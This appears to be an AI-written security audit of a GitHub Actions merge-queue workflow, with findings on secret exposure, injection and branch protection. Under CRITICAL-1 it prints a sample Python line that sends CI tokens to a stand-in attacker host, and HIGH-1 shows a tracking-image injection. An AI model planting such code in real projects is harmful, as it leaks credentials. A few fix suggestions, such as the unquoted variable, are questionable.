# Security Audit Report — merge-queue

**Date:** 2026-04-03
**Auditor:** Claude (claude-sonnet-4-6)
**Scope:** `merge_queue/`, `.github/workflows/`, `pyproject.toml`
**Branch audited:** `main` (commit post-pull, 2026-04-03)

---

## Executive Summary

The merge queue has **two critical vulnerabilities** and **three high-severity issues**. The most serious is that the workflow installs Python code directly from a PR branch and then runs it with `GITHUB_TOKEN` and `MQ_ADMIN_TOKEN` in scope — this gives any contributor who can submit a PR unconditional code execution with those secrets. A secondary critical issue is workflow command injection via unsanitized PR data written into a `$GITHUB_OUTPUT` shell context.

---

## Findings

### CRITICAL-1: Arbitrary code execution from PR branch with live secrets

**File:** `.github/workflows/merge-queue.yml`, lines 40–54

**Description:**

When the workflow is triggered by a `pull_request` event (label added/removed), the "Install merge queue" step checks out the PR's head SHA and runs `pip install ".[dev]"` from it:

```yaml
git checkout "$HEAD_SHA" 2>/dev/null
pip install ".[dev]"
```

Immediately after installation, the workflow runs:

```yaml
- name: Run merge queue
  run: python -m merge_queue ${{ steps.cmd.outputs.cmd }}
  env:
    GITHUB_TOKEN: ${{ github.token }}
    MQ_ADMIN_TOKEN: ${{ secrets.MQ_ADMIN_TOKEN }}
```

Any code installed from the PR branch runs in the same process as that `python -m merge_queue` call. An attacker can modify any file under `merge_queue/` — for instance `merge_queue/__init__.py` or `merge_queue/cli.py` — to exfiltrate `os.environ["GITHUB_TOKEN"]` and `os.environ["MQ_ADMIN_TOKEN"]` at import time.

There is no sandboxing between the installed package and the secret-bearing environment.

**Attack scenario:**

1. Attacker opens a PR that modifies `merge_queue/__init__.py` to add:
   ```python
   import os, urllib.request
   urllib.request.urlopen(
       "https://attacker.example.com/?" +
       os.environ.get("GITHUB_TOKEN","") +
       "&a=" + os.environ.get("MQ_ADMIN_TOKEN","")
   )
   ```
2. Attacker (or a repo maintainer, or a bot) adds the `queue` or `re-test` label.
3. The workflow installs from the PR head, then runs `python -m merge_queue enqueue <n>`.
4. The `__init__.py` runs at import time, exfiltrating both tokens before the MQ logic is reached.

**Impact:** Full exfiltration of `GITHUB_TOKEN` (write access to repo: push, merge, create releases, etc.) and `MQ_ADMIN_TOKEN` (ruleset administration: bypass branch protection on any branch).

**Fix options:**

- **Preferred:** Remove the bootstrap workaround entirely. Install from `main` always (this is the default). Accept that new MQ changes require a follow-up commit to `main` before they take effect on their own enqueue.
- **If the bootstrap is necessary:** Install from the PR branch in a separate job that has NO secrets. Pass the result as an artifact. Run the secret-bearing job in a distinct, isolated step using only the artifact. This requires a two-job architecture.
- **Minimum viable fix:** Do not pass `MQ_ADMIN_TOKEN` and `GITHUB_TOKEN` as environment variables to the `Run merge queue` step when the trigger is a `pull_request` event from a PR that modifies `merge_queue/` code. Detect this with a path filter and fail fast instead.

---

### CRITICAL-2: Workflow command injection via `steps.cmd.outputs.cmd`

**File:** `.github/workflows/merge-queue.yml`, line 75

```yaml
- name: Run merge queue
  run: python -m merge_queue ${{ steps.cmd.outputs.cmd }}
```

The value of `steps.cmd.outputs.cmd` is assembled in the "Determine command" step (lines 62–72) by interpolating PR data directly into a shell `echo` statement:

```yaml
echo "cmd=retest ${{ github.event.pull_request.number }}" >> "$GITHUB_OUTPUT"
echo "cmd=enqueue ${{ github.event.pull_request.number }}" >> "$GITHUB_OUTPUT"
echo "cmd=abort ${{ github.event.pull_request.number }}" >> "$GITHUB_OUTPUT"
```

`github.event.pull_request.number` is an integer provided by GitHub and is not directly injectable. However, the `workflow_dispatch` path writes the raw user-supplied `inputs.command` choice into `$GITHUB_OUTPUT`:

```yaml
echo "cmd=${{ inputs.command }}" >> "$GITHUB_OUTPUT"
```

For `workflow_dispatch`, `inputs.command` is constrained to a `choice` type (`process`, `check-rules`, `status`), so this specific path is low risk. The deeper problem is structural: `${{ steps.cmd.outputs.cmd }}` is interpolated directly into the `run:` shell script without quoting:

```yaml
run: python -m merge_queue ${{ steps.cmd.outputs.cmd }}
```

If `steps.cmd.outputs.cmd` ever contains shell metacharacters (e.g., because a future change adds a PR title or branch name to the output), this becomes a shell injection vector. PR titles and branch names are attacker-controlled strings and must never appear in an unquoted shell context.

Additionally, the label-based trigger reads `${{ github.event.label.name }}` in an `if:` expression. While GitHub expressions in `if:` are not shell-executed, any future copy-paste of this pattern into a `run:` step would be critical.

**Fix:**

Quote the interpolation and use environment variables instead:

```yaml
- name: Run merge queue
  run: python -m merge_queue $MQ_CMD
  env:
    MQ_CMD: ${{ steps.cmd.outputs.cmd }}
    GITHUB_TOKEN: ${{ github.token }}
    MQ_ADMIN_TOKEN: ${{ secrets.MQ_ADMIN_TOKEN }}
```

This prevents any shell interpretation of the command string. The argument is still passed as a single positional word, which is sufficient since the value is already validated to be one of a small set of known subcommands.

---

### HIGH-1: PR data rendered into GitHub comment Markdown without sanitization

**File:** `merge_queue/comments.py`, lines 16–27 (`_stack_list`)

```python
def _stack_list(stack: list[dict]) -> str:
    lines = []
    for pr in stack:
        num = pr.get("number", "?")
        title = pr.get("title", "")
        head = pr.get("head_ref", "")
        line = f"- #{num} `{head}`"
        if title:
            line += f" — {title}"
        lines.append(line)
    return "\n".join(lines)
```

`head_ref` (branch name) and `title` (PR title) are attacker-controlled strings that are embedded directly into Markdown comment bodies. GitHub renders these comments in the PR UI.

**Attack scenarios:**

- **Branch name injection:** A branch named `` `foo` bar`` or `` ` `` can break out of the inline code span and inject arbitrary Markdown. Example branch: `feature/foo\` ![x](https://attacker.com/pixel.png)` would close the backtick span and inject an image tag that phones home (an exfiltration channel for the comment viewer's session, useful for CSRF probing).
- **PR title injection:** Titles allow free-form Unicode and special characters. A title like `**Merge Queue — Merged** to \`main\`. ... [Click here](javascript:...)` could confuse the Markdown renderer.

GitHub's comment rendering does sanitize `javascript:` links in most contexts, but broken Markdown structure can produce unexpected rendering artifacts, broken UI, and in edge cases confusion attacks against repo maintainers reviewing queue status.

**Fix:**

Sanitize `head_ref` and `title` before embedding in Markdown. At minimum, escape backticks in `head_ref` and strip or escape Markdown special characters in `title`:

```python
def _sanitize_inline(s: str) -> str:
    """Strip characters that break Markdown inline contexts."""
    return s.replace("`", "").replace("[", "").replace("]", "").replace("\n", " ")
```

Apply this to `title` and escape backticks in the `head` variable before the f-string.

---

### HIGH-2: State branch (`mq/state`) writable by any PR author

**File:** `merge_queue/store.py`; GitHub permissions model

**Description:**

The queue's authoritative state is stored in `state.json` on the `mq/state` branch. The workflow has `contents: write` permission. The `mq/state` branch appears to have no explicit branch protection configured by the MQ itself — it is only written to by the workflow bot account.

However, if the repo's branch protection does not explicitly protect `mq/state`, any user with push access to the repo (not just PR authors) could directly push to `mq/state` and rewrite `state.json`. This would allow:

- Injecting a fake `active_batch` with a chosen `ruleset_id` to confuse the abort logic.
- Reordering the queue by rewriting the `queue` array.
- Inserting a fake history entry to cause the "recently merged" guard to skip re-enqueue.
- Clearing the state to silently dequeue all pending PRs.

Note: this requires push access to the repo, not just PR submission. Depending on repo settings (e.g., allowing fork PRs to push to target branches), the attack surface may be wider.

**Fix:**

Apply a branch ruleset to `mq/state` that allows only the `github-actions[bot]` actor to push. The MQ already has the infrastructure to create rulesets (via `MQ_ADMIN_TOKEN`) — add a setup step that ensures `mq/state` is protected on first run.

---

### HIGH-3: `MQ_ADMIN_TOKEN` passed to PR-installed code with no privilege separation

**File:** `.github/workflows/merge-queue.yml`, lines 76–78

```yaml
env:
  GITHUB_TOKEN: ${{ github.token }}
  MQ_ADMIN_TOKEN: ${{ secrets.MQ_ADMIN_TOKEN }}
```

`MQ_ADMIN_TOKEN` is described in `github_client.py` as granting Administration permission, which is required for creating and deleting branch rulesets (i.e., bypass branch protection). This token is passed unconditionally to every invocation of `python -m merge_queue`, including the enqueue and abort commands that do not require admin privileges.

The principle of least privilege dictates that tokens should be scoped to the operations that require them. If an attacker achieves code execution (as in CRITICAL-1), the `MQ_ADMIN_TOKEN` exfiltration is the higher-value target: it can remove all branch protection rules from the repo permanently.

**Fix:**

Only inject `MQ_ADMIN_TOKEN` when the subcommand actually requires it (`process` calls `create_ruleset`/`delete_ruleset`; `abort` calls `delete_ruleset`). The `enqueue`, `status`, and `check-rules` subcommands do not require it. Refactor the "Determine command" step to set a flag indicating whether admin privileges are needed, and conditionally include the token.

Alternatively, pass `MQ_ADMIN_TOKEN` as a CLI argument rather than an environment variable, so it is scoped to a subprocess boundary. This is a deeper refactor but eliminates ambient token exposure.

---

### MEDIUM-1: `pyproject.toml` install hooks not present but the attack surface exists

**File:** `pyproject.toml`

The current `pyproject.toml` uses `setuptools` as the build backend with no `[tool.setuptools.cmdclass]` overrides, no `setup.py`, no `setup.cfg` build hooks, and no custom entry points that execute at install time. The package discovery is limited to `merge_queue*` via `find`.

**Current state:** No active install-hook vulnerability.

**Residual risk:** The bootstrap step (`pip install ".[dev]"` from the PR branch) would execute any `build-system` hooks defined in a modified `pyproject.toml`. If an attacker changes the build backend to one that executes arbitrary code during the wheel build (e.g., a custom `setuptools` hook or switching to `hatchling` with a custom build hook), they achieve the same code execution as CRITICAL-1 but at install time rather than import time — and potentially before the `pip install` output is even visible in the logs.

**Fix:** This is subsumed by fixing CRITICAL-1. If the PR branch is never installed in a secrets-bearing context, this attack surface disappears.

---

### MEDIUM-2: Logging of error strings that may echo token fragments

**File:** `merge_queue/cli.py`, lines 399, 407, 487 (and others)

Exception messages from the `requests` library (used in `github_client.py`) can include the full request URL and, depending on the exception type, the `Authorization` header value. Python's default exception formatting does not redact headers. If a `requests.HTTPError` or `requests.ConnectionError` is raised, the exception string logged via `log.error(...)` or `log.warning(...)` may contain fragments of the bearer token.

**Example risky pattern:**
```python
log.error("Failed to create batch: %s", e)
```

GitHub Actions logs are retained and viewable by anyone with repo read access (public repos) or org members (private repos). An incomplete token fragment leaking into logs reduces the brute-force space for token recovery.

**Fix:**

Catch `requests.HTTPError` separately and log only `e.response.status_code` and `e.response.reason` without the full exception chain. Use a sanitizing wrapper:

```python
def _safe_error(e: Exception) -> str:
    if hasattr(e, "response") and e.response is not None:
        return f"HTTP {e.response.status_code} {e.response.reason}"
    msg = str(e)
    # Strip anything that looks like a bearer token
    import re
    return re.sub(r'Bearer\s+\S+', 'Bearer [REDACTED]', msg)
```

---

### LOW-1: `dispatch_ci_on_ref` accepts arbitrary branch refs from PR data

**File:** `merge_queue/cli.py`, line 621; `merge_queue/github_client.py`, line 547

The `do_retest` function dispatches a CI workflow run on `pr_data["head"]["ref"]` — a branch name fetched from the GitHub API for an open PR. While this is not directly attacker-controlled (it goes through the API), it is worth noting that the `workflow_dispatch` event is being triggered with a user-controlled branch name as both the `ref` and the `inputs.ref`. The `ci.yml` workflow uses `inputs.ref` as a `git checkout` ref without quoting issues in the YAML (it uses `${{ inputs.ref || github.sha }}`), which is safe as a GitHub expression. No direct injection risk identified, but the pattern should be reviewed if the CI workflow is extended.

---

### LOW-2: Concurrency group does not cover CI workflow

**File:** `.github/workflows/merge-queue.yml`, lines 13–15

The `concurrency: group: merge-queue` setting prevents two MQ workflow runs from overlapping. However, it does not prevent a race between an MQ run dispatching CI and a separate PR label event triggering a second MQ run after the `store.write(state)` call sets `active_batch` but before CI completes.

The code has a 30-minute stale-batch recovery timer and state-based guards, which mitigate this, but the window between `store.write` and CI completion is long enough for a race if GitHub's concurrency enforcement has any gap (e.g., a rapid label add/remove/add sequence). This is an operational reliability issue more than a security issue, but could be used to DoS the queue.

---

## Summary Table

| ID | Severity | Title |
|---|---|---|
| CRITICAL-1 | Critical | Arbitrary code execution from PR branch with live secrets |
| CRITICAL-2 | Critical | Workflow shell injection via unquoted `steps.cmd.outputs.cmd` |
| HIGH-1 | High | PR data (branch name, title) embedded in Markdown without sanitization |
| HIGH-2 | High | `mq/state` branch unprotected, writable by any repo push-access holder |
| HIGH-3 | High | `MQ_ADMIN_TOKEN` passed to all subcommands, no privilege separation |
| MEDIUM-1 | Medium | `pyproject.toml` install hook attack surface (latent, blocked by CRITICAL-1 fix) |
| MEDIUM-2 | Medium | Exception logging may echo token fragments |
| LOW-1 | Low | `dispatch_ci_on_ref` uses PR-supplied branch ref |
| LOW-2 | Low | Concurrency gap allows queue DoS via rapid label events |

---

## Recommended Fix Priority

1. **Fix CRITICAL-1 immediately** — remove the PR-branch bootstrap or isolate it from secrets.
2. **Fix CRITICAL-2** — quote `${{ steps.cmd.outputs.cmd }}` via an env var.
3. **Fix HIGH-3** — scope `MQ_ADMIN_TOKEN` to only the subcommands that require it.
4. **Fix HIGH-1** — sanitize branch names and PR titles before Markdown embedding.
5. **Fix HIGH-2** — protect `mq/state` with a ruleset allowing only the bot actor.
6. MEDIUM and LOW items can be addressed in a follow-up pass.

---

*This report was produced by automated analysis of the codebase at the commit shown above. It does not substitute for a full penetration test or a red-team exercise against a live deployment.*
